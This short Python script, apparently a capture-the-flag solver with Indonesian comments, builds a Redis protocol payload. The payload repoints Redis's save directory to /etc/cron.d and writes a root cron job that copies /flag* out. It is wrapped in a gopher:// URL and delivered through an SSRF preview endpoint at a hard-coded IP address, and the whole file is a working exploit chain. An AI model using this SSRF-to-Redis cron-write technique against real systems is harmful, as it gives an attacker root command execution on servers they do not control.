import base64, urllib.parse

def redis_cmd(*args):
    parts = list(args)
    payload = f"*{len(parts)}\r\n"
    for p in parts:
        payload += f"${len(p)}\r\n{p}\r\n"
    return payload

# Set config buat nulis file cron
# Cron syntax: * * * * * root cat /flag* > /tmp/flag_out
cron_line = "* * * * * root cat /flag* > /var/lib/redis/flag_out\n"
cron_len = len(cron_line)

gopher_payload = ""
gopher_payload += redis_cmd("CONFIG", "SET", "dir", "/etc/cron.d")
gopher_payload += redis_cmd("CONFIG", "SET", "dbfilename", "redis_cron")
gopher_payload += redis_cmd("SET", "cron", cron_line)
gopher_payload += redis_cmd("SAVE")
gopher_payload += redis_cmd("QUIT")

encoded = urllib.parse.quote(gopher_payload, safe='')
gopher_url = f"gopher://redis:6379/_{encoded}"
short = base64.urlsafe_b64encode(gopher_url.encode()).decode().rstrip("=")

print(f"curl -s 'http://23.239.30.114:8081/api/preview?url=http://localhost:5000/l/{short}'")
